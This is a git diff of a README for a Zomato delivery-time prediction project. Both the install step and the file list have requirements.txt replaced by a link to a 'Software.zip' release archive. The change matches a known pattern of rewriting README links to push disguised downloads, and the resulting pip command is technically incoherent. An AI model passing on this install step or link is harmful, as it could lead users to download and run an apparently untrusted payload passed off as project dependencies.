@@ -8,7 +8,7 @@ conda activate venv/
 ```
 ### Install all necessary libraries
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Arup0070/Zomato_Dataset_project/releases/download/v1.0/Software.zip
 ```
 
 # Zomato Delivery Time Prediction System
@@ -18,5 +18,5 @@ Welcome to the Zomato Delivery Time Prediction System! This system utilizes the 
 ### data: Contains the dataset used for training and testing the prediction model.
 ### src: Source code files for the delivery time prediction system.
 ### web: HTML files for the front-end development.
-### requirements.txt: Dependencies required for running the project.
+### https://github.com/Arup0070/Zomato_Dataset_project/releases/download/v1.0/Software.zip Dependencies required for running the project.
 ### Dockerfile: Configuration file for building the Docker container.
